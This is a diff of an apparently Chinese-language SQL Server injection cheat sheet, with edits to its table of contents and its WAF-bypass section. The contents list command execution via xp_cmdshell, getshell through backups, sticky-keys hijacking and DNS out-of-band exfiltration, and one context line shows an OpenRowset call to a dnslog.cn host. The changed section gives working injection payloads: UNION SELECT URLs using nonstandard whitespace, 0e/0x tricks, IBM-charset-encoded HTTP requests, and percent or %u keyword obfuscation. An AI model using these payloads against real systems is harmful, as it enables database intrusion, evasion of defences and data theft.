@@ -16,12 +16,12 @@
     - [差异备份GetShell](#差异备份getshell)
     - [日志备份GetShell](#日志备份getshell)
 - [进阶利用](#进阶利用)
-  - [xp_dirtree](#xp_dirtree)
-  - [sp_oacreate](#sp_oacreate)
-  - [xp_cmdshell](#xp_cmdshell)
+  - [xp\_dirtree](#xp_dirtree)
+  - [sp\_oacreate](#sp_oacreate)
+  - [xp\_cmdshell](#xp_cmdshell)
   - [Ole automation procedures](#ole-automation-procedures)
-  - [ap_addlogin添加用户](#ap_addlogin添加用户)
-  - [xp_regwrite劫持粘滞键](#xp_regwrite劫持粘滞键)
+  - [ap\_addlogin添加用户](#ap_addlogin添加用户)
+  - [xp\_regwrite劫持粘滞键](#xp_regwrite劫持粘滞键)
   - [CLR执行命令](#clr执行命令)
     - [创建sql文件](#创建sql文件)
     - [C#代码](#c代码)
@@ -35,9 +35,9 @@
       - [利用条件](#利用条件-1)
 - [Some Tricks](#some-tricks)
   - [DNS带外](#dns带外)
-    - [fn_xe_file_target_read_file()](#fn_xe_file_target_read_file)
-    - [fn_get_audit_file()](#fn_get_audit_file)
-    - [fn_trace_gettable()](#fn_trace_gettable)
+    - [fn\_xe\_file\_target\_read\_file()](#fn_xe_file_target_read_file)
+    - [fn\_get\_audit\_file()](#fn_get_audit_file)
+    - [fn\_trace\_gettable()](#fn_trace_gettable)
   - [替换报错表达式](#替换报错表达式)
   - [获取存储过程执行结果,查询配置是否开启](#获取存储过程执行结果查询配置是否开启)
   - [格式化数据](#格式化数据)
@@ -46,7 +46,6 @@
     - [OpenRowset()](#openrowset)
   - [爆出当前SQL语句](#爆出当前sql语句)
   - [BypassWAF](#bypasswaf)
-    - [ASP.NET 编码bypass](#aspnet-编码bypass)
 # Basic
 
 ## 基础查询
@@ -465,19 +464,18 @@ select * from OpenRowset('sqloledb','server=aaaa.dnslog.cn;uid=sa;pwd=sa','')
 
 **权限**：如果用户在服务器上具有“查看服务器状态”权限，则该用户将在SQL Server实例上看到所有正在执行的会话；否则，用户将仅看到当前会话。
 ## BypassWAF
-非标准的空白字符：%C2%85 или %C2%A0
+1. 非标准的空白字符：%C2%85 или %C2%A0,空白字符: 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20
 [https://vuln.app/getItem?id=1unionselect null,@@version,null--](https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--)
-科学（0e）和十六进制（0x）表示法，用于混淆UNION：
+2. 科学（0e）和十六进制（0x）表示法，用于混淆UNION：
 [https://vuln.app/getItem?id=0eunion+select+null,@@version,null--](https://vuln.app/getItem?id=0eunion+select+null,@@version,null--)
 [https://vuln.app/getItem?id=0xunion+select+null,@@version,null--](https://vuln.app/getItem?id=0xunion+select+null,@@version,null--)
-在FROM和列名之间用点代替空格：
+3. 在FROM和列名之间用点代替空格：
 [https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--](https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--)
-SELECT和一次性列之间的\N分隔符：
+4. SELECT和一次性列之间的\N分隔符：
 [https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--](https://vuln.app/getItem?id=0xunion+select%5CNnull,@@version,null+from+users--)
+5. IIS+sqlserver: IBM 编码bypass
 
-### ASP.NET 编码bypass
-
-```
+```http
 POST /test/a.aspx?%C8%85%93%93%96%E6%96%99%93%84= HTTP/1.1 
 Host: target 
 User-Agent: UP foobar 
@@ -486,8 +484,11 @@ x-up-devcap-post-charset: ibm500 或者ibm037
 Content-Length: 40 
 
 %89%95%97%A4%A3%F1=%A7%A7%A7%A7%A7%A7%A7
-```
+
+
 1.添加HTTP头 x-up-devcap-post-charset来表明使用的字符集，代替charset字段  
 2.添加UserAgent： UP xxx  
 3.参数键值都要编码  
-
+```
+6. 百分号%:在ASP+IIS时,单独的%会被忽略,绕过关键字,`sel%ect * from admin`.
+7. %u:asp+iis,aspx+iis,对关键字的某个字符进行Unicode编码.
